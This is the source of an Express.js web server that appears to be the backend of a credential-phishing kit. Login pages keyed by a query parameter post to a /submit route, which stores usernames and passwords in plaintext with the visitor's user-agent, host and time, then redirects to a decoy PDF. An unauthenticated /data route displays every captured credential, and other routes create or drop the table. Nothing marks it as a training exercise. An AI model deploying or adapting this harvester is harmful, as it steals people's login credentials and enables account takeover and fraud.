const express = require('express')
const bodyParser = require('body-parser')
const app = express();
const db = require('./db');
const PORT = 3000;

// Set EJS as the templating engine
app.set('view engine', 'ejs');
app.use(express.static('public'))


// Middleware to parse the request body (for form submissions)
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());






// INDEX ROUTE

app.get('/', (req, res) => {  
  const data = req.query.abcd;   //replcae parameter name "query"
  if (data == undefined){
    res.render('error');
  }else{ 
  res.render('index', { data });  
}
});


// SECOND LOAD ROUTE

app.get('/load', (req, res) => {
  const data = req.query.abcd;

  if (data == undefined){
    res.render('error');
  }else{ 
  res.render('load', { data });  
  }
})


// Third LOGIN ROUTE

app.get('/login', (req, res) => {
  const data = req.query.abcd;

  if (data == undefined){
    res.render('error');
  }else{ 
  res.render('login', { data });  
  }
})


//Handle the POST request to "/submit"
app.post('/submit', (req, res) => {
  // Accessing the data from the POST request
  const name = req.body.username;
  const passwd = req.body.password;
  const agent = req.headers['user-agent'];
  const ip = req.headers['host'];
  const time = new Date().toISOString();
  



  const checkQuery = 'SELECT * FROM table1 WHERE username = ?';

  db.query(checkQuery, [name], (err, results) => {
    if (err) throw err;
  
    if (results.length > 0) {
      // Record found, update it
      const updateQuery = `
        UPDATE table1 
        SET password = ?, requestIP = ?, requestOS = ?, requestTime = ? 
        WHERE username = ?
      `;
      db.query(updateQuery, [passwd, ip, agent, time, name], (err, result) => {
        if (err) throw err;
        console.log('Record updated');
      });
    } else {
      // No record found, insert a new one
      const insertQuery = `
        INSERT INTO table1 (username, password, requestIP, requestOS, requestTime) 
        VALUES (?, ?, ?, ?, ?)
      `;
      db.query(insertQuery, [name, passwd, ip, agent, time], (err, result) => {
        if (err) throw err;
        console.log('Record inserted');
      });
    }
  });

  res.redirect("/123.pdf")
});



// Route to fetch and render data
app.get('/data', (req, res) => {
  const query = `SELECT * FROM table1`;

  db.query(query, (err, result) => {
    if (err) {
      
      res.status(500).send('Error Fetching Data');
    } else {

      res.render('table' , {data:result})
       
    }
});
})

// Route to create table
app.get('/create', (req, res) => {
  
  // Check if the table exists, and create it if it doesn't
  const createTableQuery = `
    CREATE TABLE IF NOT EXISTS table1 (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(255) NOT NULL,
      password VARCHAR(255) NOT NULL,
      requestIP VARCHAR(255) NOT NULL,
      requestOS VARCHAR(255) NOT NULL,
      requestTime VARCHAR(255) NOT NULL
    )
  `;

  db.query(createTableQuery, (err, result) => {
    if (err) {
      
      res.status(500).send('Error creating table Data');
    } else {

      res.send('table created')
       
    }
});
})


// Route to delete data
app.get('/delete', (req, res) => {
  const query = `DROP TABLE table1`;

  db.query(query, (err, result) => {
    if (err) {
      
      res.status(500).send('Error Deleting Data');
    } else {

      res.send('table deleted')
       
    }
});
})





// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
